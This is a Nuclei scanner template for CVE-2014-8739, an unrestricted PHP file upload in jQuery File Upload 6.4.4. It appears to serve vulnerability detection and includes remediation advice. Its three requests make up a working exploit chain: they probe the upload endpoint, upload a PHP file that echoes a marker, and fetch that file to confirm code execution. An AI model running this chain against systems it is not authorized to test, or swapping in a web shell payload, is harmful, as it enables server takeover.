id: CVE-2014-8739

info:
  name: jQuery File Upload 6.4.4 - Unrestricted File Upload
  author: pranjal
  severity: critical
  description: |
    jQuery File Upload Plugin 6.4.4 contains an unrestricted file upload caused by lack of validation in server/php/UploadHandler.php, letting remote attackers execute arbitrary PHP code by uploading PHP files, exploit requires uploading a PHP file with a PHP extension and accessing it directly.
  impact: |
    Successful exploitation of this vulnerability can lead to remote code execution by uploading malicious PHP files, potentially compromising the entire web application and server.
  remediation: |
    Upgrade to a patched version of jQuery File Upload plugin, implement proper server-side file type validation, restrict upload directories and file permissions, and use a whitelist approach for allowed file extensions.
  reference:
    - https://www.exploit-db.com/exploits/35057/
    - https://www.exploit-db.com/exploits/36811/
    - https://nvd.nist.gov/vuln/detail/CVE-2014-8739
  classification:
    cvss-metrics: CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H
    cvss-score: 9.8
    cve-id: CVE-2014-8739
    cwe-id: CWE-434
    epss-score: 0.94326
    epss-percentile: 0.99943
    cpe: cpe:2.3:a:jquery_file_upload_project:jquery_file_upload:*:*:*:*:*:*:*:*
  metadata:
    verified: true
    max-request: 3
    vendor: jquery_file_upload_project
    product: jquery_file_upload
  tags: cve,cve2014,edb,file-upload,intrusive,jquery,kev,rce

variables:
  string: "{{randstr}}"
  filename: "{{rand_base(5)}}"
  php_payload: |
    <?php
    echo "{{string}}";
    ?>

http:
  # Step 1: Check if the vulnerable endpoint exists and identify jQuery File Upload
  - method: GET
    path:
      - "{{BaseURL}}/server/php/"

    matchers-condition: and
    matchers:
      - type: regex
        part: body
        regex:
          - '^{\"files\":\s*\[\]'
        internal: true

      - type: dsl
        dsl:
          - 'status_code == 200'
          - 'contains(body, "files")'
          - 'contains(content_type, "text/plain")'
        condition: and
        internal: true

    extractors:
      - type: regex
        name: upload_url
        part: body
        regex:
          - '"url":\s*"([^"]+)"'
          - '"upload_url":\s*"([^"]+)"'

  # Step 2: Attempt to upload a PHP file with specific jQuery File Upload response patterns
  - raw:
      - |
        POST /server/php/ HTTP/1.1
        Host: {{Hostname}}
        Content-Type: multipart/form-data; boundary=----WebKitFormBoundary{{string}}

        ------WebKitFormBoundary{{string}}
        Content-Disposition: form-data; name="files[]"; filename="{{filename}}.php"
        Content-Type: application/x-php

        {{php_payload}}
        ------WebKitFormBoundary{{string}}--

    matchers-condition: and
    matchers:
      - type: regex
        part: body
        regex:
          - '"files":\s*\[[^\]]*"[^"]*{{filename}}[^"]*"'
        internal: true

      - type: dsl
        dsl:
          - 'status_code == 200'
          - 'contains_all(body, "{{filename}}", "files")'
          - 'contains(content_type, "text/plain")'
        condition: and
        internal: true

    extractors:
      - type: regex
        name: uploaded_file
        part: body
        regex:
          - '"name":\s*"([^"]+)"'
          - '"url":\s*"([^"]+)"'

  # Step 3: Verify the uploaded file is accessible and contains our unique payload
  - method: GET
    path:
      - "{{BaseURL}}/server/php/files/{{filename}}.php"

    matchers:
      - type: dsl
        dsl:
          - 'status_code == 200 && contains(body, "{{string}}")'
